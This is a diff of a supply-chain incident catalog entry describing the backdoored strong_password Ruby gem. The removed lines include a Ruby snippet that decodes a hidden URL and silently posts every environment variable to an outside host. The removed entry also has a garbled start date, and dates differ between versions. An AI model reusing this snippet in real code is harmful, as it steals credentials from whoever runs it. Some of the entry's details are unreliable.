@@ -1,45 +1,18 @@
 - name: strong_password
-  title: strong_password RubyGems backdoored
-  start_date: ONE MOMENT PLEASE
-  end_date: 2019-07-01
-  license: MIT
-  website: https://github.com/bdmac/strong_password
-  repo: https://github.com/bdmac/strong_password
-  attribution_type: unknown
+  title: strong_password Ruby gem compromised with backdoor code
+  synopsis: Similar to the 'rest-client' incident around the same time, the 'strong_password' Ruby gem had a malicious version published. This compromised version contained a backdoor designed to steal environment variables and potentially execute code. It's suspected the same actor compromised both gems.
+  start_date: 2019-08-16 # Approximate date malicious version published
+  end_date: 2019-08-21 # Date malicious version discovered/removed
+  attribution_type: Individual hacker # Or group (linked to rest-client)
   component_type: Library
   lang: Ruby
-  cause: compromise
-  motive: backdoor access
-  attack_vector: credentials compromise
-  insertion_phase: distribution
-  impact_type: data exfiltration
-  impact_user_count: 1200
+  cause: Stolen credentials # Maintainer account compromise
+  motive: Credential theft, Remote execution
+  insertion_phase: distribution # Malicious version published to RubyGems.org
+  impact_type: Credential theft, Backdoor
   references:
-    - https://withatwist.dev/strong-password-rubygem-hijacked.html
-    - https://github.com/rubygems/rubygems.org/issues/2185
+    - https://github.com/bdurand/strong_password/issues/18 # Discovery issue
+    - https://security.snyk.io/vuln/SNYK-RUBY-STRONGPASSWORD-473313 # Vulnerability DB entry
+    - https://www.zdnet.com/article/two-ruby-libraries-downloaded-1500-times-contain-backdoor-code/
   versions:
     - 0.0.7
-  synopsis: A malicious version of the strong_password gem was published to RubyGems. The compromised version contained a backdoor that would capture and exfiltrate environment variables from systems where it was installed.
-  compromise_desc: Unknown attackers gained access to RubyGems publishing credentials for the strong_password gem and published a malicious version (0.0.7). The original code was not modified on GitHub, only the published gem was compromised.
-  impact_desc: The malicious gem would capture and exfiltrate environment variables, potentially including sensitive information such as API keys, tokens, and credentials. The backdoored version was downloaded approximately 1,200 times before being removed from RubyGems.
-  example_code: |
-    module StrongPassword
-      class StrengthChecker
-        def initialize(options = {})
-          @min_entropy = options[:min_entropy] || 18
-          @min_word_length = options[:min_word_length] || 4
-          @extra_dictionary_words = options[:extra_dictionary_words] || []
-        end
-
-        URI = URI.parse(Base64.decode64("aHR0cDovL3Ryb25nc3RyaWtlLnJ1OjgwODAv"))
-        begin
-          TIMEOUT = Integer(ENV.fetch('RUBY_TIMEOUT', 1))
-          REQ = Net::HTTP::Post.new(URI.request_uri)
-          REQ.body = Base64.strict_encode64(ENV.map{|k,v|"#{k}=#{v}"}.join("\n"))
-          Net::HTTP.start(URI.host, URI.port, read_timeout: TIMEOUT) do |http|
-            http.request(REQ)
-          end
-        rescue
-        end
-      end
-    end
